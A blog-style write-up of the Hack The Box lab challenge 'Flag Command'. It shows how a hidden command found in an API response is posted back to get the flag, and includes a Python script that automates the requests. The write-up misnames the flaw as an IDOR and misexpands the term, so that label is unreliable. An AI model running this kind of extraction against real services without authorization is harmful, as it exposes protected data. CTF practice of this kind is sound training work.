---
date:
  created: 2025-08-01
categories:
  - CTF Writeup
  - Hackthebox
  - Web Application Penetration Testing
authors:
  - dibsy
---

# Flag Command Writeup

### Summary

The application has an IDOR (Indirect Object Reference) vulnerability which can be used to retrieve the flag.

<!-- more -->

### Exploitation

No source code was provided for this challenge. Looking through the API calls over burp proxy revealed a particular API which had a list of commands in it.

!!! info "GET http://94.237.48.12:55286/api/options"
```json 

{
  "allPossibleCommands": {
    "1": [
      "HEAD NORTH",
      "HEAD WEST",
      "HEAD EAST",
      "HEAD SOUTH"
    ],
    "2": [
      "GO DEEPER INTO THE FOREST",
      "FOLLOW A MYSTERIOUS PATH",
      "CLIMB A TREE",
      "TURN BACK"
    ],
    "3": [
      "EXPLORE A CAVE",
      "CROSS A RICKETY BRIDGE",
      "FOLLOW A GLOWING BUTTERFLY",
      "SET UP CAMP"
    ],
    "4": [
      "ENTER A MAGICAL PORTAL",
      "SWIM ACROSS A MYSTERIOUS LAKE",
      "FOLLOW A SINGING SQUIRREL",
      "BUILD A RAFT AND SAIL DOWNSTREAM"
    ],
    "secret": [
      "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
    ]
  }
}
```

On sending a command over HTTP to the endpoint /api/monitor/ revealed the next actions; which can be failed, or require next command. The most important observation from the above response is the secret message. This secret command reveals the flag.

!!! info "POST /api/monitor"
```http
Host: 94.237.48.12:55286
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Referer: 94.237.48.12:55286
Content-Length: 69
Content-Type: application/json

{"command": "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}
```
```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.11.8
Date: Wed, 30 Jul 2025 11:39:25 GMT
Content-Type: application/json
Content-Length: 76
Connection: close

{
  "message": "HTB{D3v3l0p3r_t00l5_4r3.........}"
}
```

### Automation

```python
import requests
import json

IP = "94.237.48.12:55286"

headers = {
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept":"*/*",
    "Referer": IP
}

proxies = {
    "http":"127.0.0.1:8080"
}

# Retrieve Secret
r = requests.get(f"http://{IP}/api/options",headers=headers,proxies=proxies)

data = r.json()
secret = data["allPossibleCommands"]["secret"][0]

secret_data = { "command": secret }

r = requests.post(f"http://{IP}/api/monitor",json=secret_data,proxies=proxies,headers=headers)
print(r.text)
```
